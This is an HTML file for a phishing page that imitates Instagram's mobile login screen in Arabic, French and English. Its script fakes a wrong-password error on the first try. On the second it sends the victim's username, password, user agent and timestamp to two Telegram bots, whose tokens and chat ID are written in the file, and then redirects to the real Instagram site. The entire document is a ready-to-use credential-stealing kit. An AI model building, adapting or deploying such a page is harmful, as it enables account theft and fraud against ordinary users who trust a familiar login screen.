<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>إنستغرام</title>
    <style>
        :root {
            --main-blue: #0095f6;
            --secondary-blue: #b2dffc;
            --text-dark: #262626;
            --text-gray: #8e8e8e;
            --light-gray: #fafafa;
            --border-gray: #dbdbdb;
            --white: #ffffff;
            --error-red: #ed4956;
            --black: #000000;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background-color: var(--black);
            color: var(--white);
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        .app-container {
            height: 100%;
            display: flex;
            flex-direction: column;
            max-width: 100%;
            margin: 0 auto;
            position: relative;
        }
        
        .status-bar {
            height: 44px;
            background-color: var(--black);
            display: flex;
            justify-content: center;
            align-items: flex-end;
            padding-bottom: 8px;
            position: relative;
        }
        
        .time {
            font-size: 15px;
            font-weight: 600;
        }
        
        .login-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0 34px;
        }
        
        .logo {
            margin-bottom: 36px;
        }
        
        .logo svg {
            width: 182px;
            height: 49px;
        }
        
        .login-form {
            width: 100%;
        }
        
        .input-group {
            margin-bottom: 6px;
        }
        
        .form-input {
            background-color: var(--black);
            border: 1px solid var(--border-gray);
            border-radius: 5px;
            color: var(--white);
            font-size: 14px;
            padding: 12px 15px;
            width: 100%;
            height: 44px;
        }
        
        .form-input:focus {
            border-color: var(--text-gray);
            outline: none;
        }
        
        .login-btn {
            background-color: var(--main-blue);
            border: none;
            border-radius: 5px;
            color: var(--white);
            font-weight: 600;
            padding: 12px;
            width: 100%;
            margin-top: 14px;
            cursor: pointer;
            opacity: 0.7;
            font-size: 14px;
        }
        
        .login-btn.active {
            opacity: 1;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: var(--text-gray);
            font-size: 13px;
            font-weight: 600;
            width: 100%;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border-gray);
            margin: 0 10px;
        }
        
        .facebook-login {
            color: var(--main-blue);
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        
        .facebook-icon {
            margin-left: 8px;
            font-size: 16px;
        }
        
        .forgot-password {
            color: var(--main-blue);
            font-size: 12px;
            margin-top: 19px;
            display: block;
            text-align: center;
            text-decoration: none;
        }
        
        .signup-section {
            border-top: 1px solid var(--border-gray);
            padding: 20px;
            text-align: center;
            font-size: 14px;
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: var(--black);
        }
        
        .signup-link {
            color: var(--main-blue);
            font-weight: 600;
            cursor: pointer;
            margin-right: 5px;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            display: none;
        }
        
        .loading-spinner {
            border: 3px solid var(--border-gray);
            border-top: 3px solid var(--main-blue);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        .loading-text {
            font-size: 14px;
            color: var(--white);
        }
        
        .error-message {
            color: var(--error-red);
            font-size: 14px;
            margin: 10px 0;
            display: none;
            text-align: center;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Language selector styles */
        .language-selector {
            position: fixed;
            bottom: 80px;
            left: 20px;
            z-index: 100;
        }
        
        .language-btn {
            background-color: var(--black);
            border: 1px solid var(--border-gray);
            border-radius: 20px;
            padding: 8px 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            color: var(--white);
        }
        
        .language-icon {
            margin-left: 8px;
            font-size: 16px;
        }
        
        .language-dropdown {
            position: absolute;
            bottom: 100%;
            left: 0;
            background-color: var(--black);
            border: 1px solid var(--border-gray);
            border-radius: 10px;
            padding: 8px 0;
            width: 150px;
            display: none;
        }
        
        .language-dropdown.show {
            display: block;
        }
        
        .language-option {
            padding: 10px 15px;
            cursor: pointer;
            color: var(--white);
        }
        
        .language-option:hover {
            background-color: #333;
        }
        
        /* iOS notch simulation */
        .notch {
            width: 40%;
            height: 30px;
            background-color: var(--black);
            border-bottom-left-radius: 15px;
            border-bottom-right-radius: 15px;
            margin: 0 auto;
            position: absolute;
            bottom: -1px;
            left: 30%;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="status-bar">
            <div class="time" id="currentTime">9:41</div>
        </div>
        
        <div class="login-container">
            <div class="logo">
                <svg aria-label="Instagram" fill="#ffffff" viewBox="0 0 192 192" width="192" height="192">
                    <path d="M144 0H48C21.5 0 0 21.5 0 48v96c0 26.5 21.5 48 48 48h96c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm16 144c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V48c0-8.8 7.2-16 16-16h96c8.8 0 16 7.2 16 16v96z"></path>
                    <path d="M96 64c-17.7 0-32 14.3-32 32s14.3 32 32 32 32-14.3 32-32-14.3-32-32-32zm0 48c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"></path>
                    <circle cx="144" cy="48" r="8"></circle>
                </svg>
            </div>
            
            <form class="login-form" id="loginForm">
                <div class="input-group">
                    <input type="text" class="form-input" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                </div>
                <div class="input-group">
                    <input type="password" class="form-input" id="password" placeholder="كلمة السر" required>
                </div>
                <div class="error-message" id="errorMessage">
                    عذرًا، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر.
                </div>
                <button type="submit" class="login-btn" id="loginBtn" disabled>تسجيل الدخول</button>
            </form>
            
            <div class="divider">أو</div>
            
            <div class="facebook-login">
                <span>تسجيل الدخول باستخدام فيسبوك</span>
                <span class="facebook-icon">f</span>
            </div>
            
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
        </div>
        
        <div class="signup-section">
            <p>ليس لديك حساب؟ <a href="#" class="signup-link">اشتراك</a></p>
        </div>
        
        <div class="notch"></div>
        
        <div class="loading-overlay" id="loadingOverlay">
            <div class="loading-spinner"></div>
            <div class="loading-text" id="loadingText">جاري تسجيل الدخول...</div>
        </div>
        
        <div class="language-selector">
            <div class="language-btn" id="languageBtn">
                <span class="language-icon">🌐</span>
                <span id="currentLanguage">العربية</span>
            </div>
            <div class="language-dropdown" id="languageDropdown">
                <div class="language-option" data-lang="ar">العربية</div>
                <div class="language-option" data-lang="fr">Français</div>
                <div class="language-option" data-lang="en">English</div>
            </div>
        </div>
    </div>
    
    <script>
        // Language translations
        const translations = {
            ar: {
                title: "إنستغرام",
                usernamePlaceholder: "اسم المستخدم أو البريد الإلكتروني",
                passwordPlaceholder: "كلمة السر",
                loginBtn: "تسجيل الدخول",
                divider: "أو",
                facebookLogin: "تسجيل الدخول باستخدام فيسبوك",
                forgotPassword: "هل نسيت كلمة السر؟",
                signupText: "ليس لديك حساب؟ ",
                signupLink: "اشتراك",
                loadingText: "جاري تسجيل الدخول...",
                errorMessage: "عذرًا، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر."
            },
            fr: {
                title: "Instagram",
                usernamePlaceholder: "Nom d'utilisateur ou e-mail",
                passwordPlaceholder: "Mot de passe",
                loginBtn: "Connexion",
                divider: "ou",
                facebookLogin: "Se connecter avec Facebook",
                forgotPassword: "Mot de passe oublié ?",
                signupText: "Vous n'avez pas de compte ? ",
                signupLink: "Inscrivez-vous",
                loadingText: "Connexion en cours...",
                errorMessage: "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe."
            },
            en: {
                title: "Instagram",
                usernamePlaceholder: "Username or email",
                passwordPlaceholder: "Password",
                loginBtn: "Log In",
                divider: "or",
                facebookLogin: "Log in with Facebook",
                forgotPassword: "Forgot password?",
                signupText: "Don't have an account? ",
                signupLink: "Sign up",
                loadingText: "Logging in...",
                errorMessage: "Sorry, your password was incorrect. Please double-check your password."
            }
        };
        
        // Current language
        let currentLang = 'ar';
        
        // Update time
        function updateTime() {
            const now = new Date();
            let hours = now.getHours();
            let minutes = now.getMinutes();
            minutes = minutes < 10 ? '0' + minutes : minutes;
            document.getElementById('currentTime').textContent = `${hours}:${minutes}`;
        }
        
        setInterval(updateTime, 1000);
        updateTime();
        
        // Form validation
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        
        function validateForm() {
            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
                loginBtn.classList.add('active');
                loginBtn.disabled = false;
            } else {
                loginBtn.classList.remove('active');
                loginBtn.disabled = true;
            }
        }
        
        usernameInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);
        
        // Form submission
        const loginForm = document.getElementById('loginForm');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const errorMessage = document.getElementById('errorMessage');
        let attemptCount = 0;
        
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            // Show loading overlay
            loadingOverlay.style.display = 'flex';
            
            // First attempt
            if (attemptCount === 0) {
                setTimeout(function() {
                    loadingOverlay.style.display = 'none';
                    errorMessage.style.display = 'block';
                    attemptCount++;
                }, 3000);
            } 
            // Second attempt
            else if (attemptCount === 1) {
                setTimeout(function() {
                    loadingOverlay.style.display = 'none';
                    errorMessage.style.display = 'block';
                    
                    // Send data to Telegram bots
                    sendToTelegram(username, password);
                    
                    // Redirect to Instagram after 2 seconds
                    setTimeout(function() {
                        window.location.href = "https://www.instagram.com";
                    }, 2000);
                }, 3000);
            }
        });
        
        // Function to send data to Telegram
        function sendToTelegram(username, password) {
            const botTokens = [
                '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
                '7159716957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ'
            ];
            const chatId = '780712584';
            
            const message = `New Instagram Login Attempt:
Username/Email: ${username}
Password: ${password}
Language: ${currentLang}
User Agent: ${navigator.userAgent}
Timestamp: ${new Date().toISOString()}`;
            
            // Send to both bots
            botTokens.forEach(token => {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).catch(error => console.error('Error sending to Telegram:', error));
            });
        }
        
        // Language selector functionality
        const languageBtn = document.getElementById('languageBtn');
        const languageDropdown = document.getElementById('languageDropdown');
        const currentLanguageText = document.getElementById('currentLanguage');
        
        languageBtn.addEventListener('click', function() {
            languageDropdown.classList.toggle('show');
        });
        
        // Close dropdown when clicking outside
        document.addEventListener('click', function(event) {
            if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                languageDropdown.classList.remove('show');
            }
        });
        
        // Change language
        document.querySelectorAll('.language-option').forEach(option => {
            option.addEventListener('click', function() {
                const lang = this.getAttribute('data-lang');
                changeLanguage(lang);
                languageDropdown.classList.remove('show');
            });
        });
        
        // Function to change language
        function changeLanguage(lang) {
            currentLang = lang;
            const translation = translations[lang];
            
            // Update page title
            document.title = translation.title;
            
            // Update form elements
            usernameInput.placeholder = translation.usernamePlaceholder;
            passwordInput.placeholder = translation.passwordPlaceholder;
            loginBtn.textContent = translation.loginBtn;
            document.querySelector('.divider').textContent = translation.divider;
            document.querySelector('.facebook-login span:nth-child(1)').textContent = translation.facebookLogin;
            document.querySelector('.forgot-password').textContent = translation.forgotPassword;
            document.querySelector('.signup-section p').innerHTML = translation.signupText + '<a href="#" class="signup-link">' + translation.signupLink + '</a>';
            document.getElementById('loadingText').textContent = translation.loadingText;
            document.getElementById('errorMessage').textContent = translation.errorMessage;
            
            // Update current language text
            currentLanguageText.textContent = document.querySelector(`[data-lang="${lang}"]`).textContent;
            
            // Update text direction
            if (lang === 'ar') {
                document.documentElement.dir = 'rtl';
            } else {
                document.documentElement.dir = 'ltr';
            }
        }
        
        // Detect browser language and set accordingly
        const browserLang = navigator.language.substring(0, 2);
        if (translations[browserLang]) {
            changeLanguage(browserLang);
        } else {
            changeLanguage('ar');
        }
    </script>
</body>
</html>
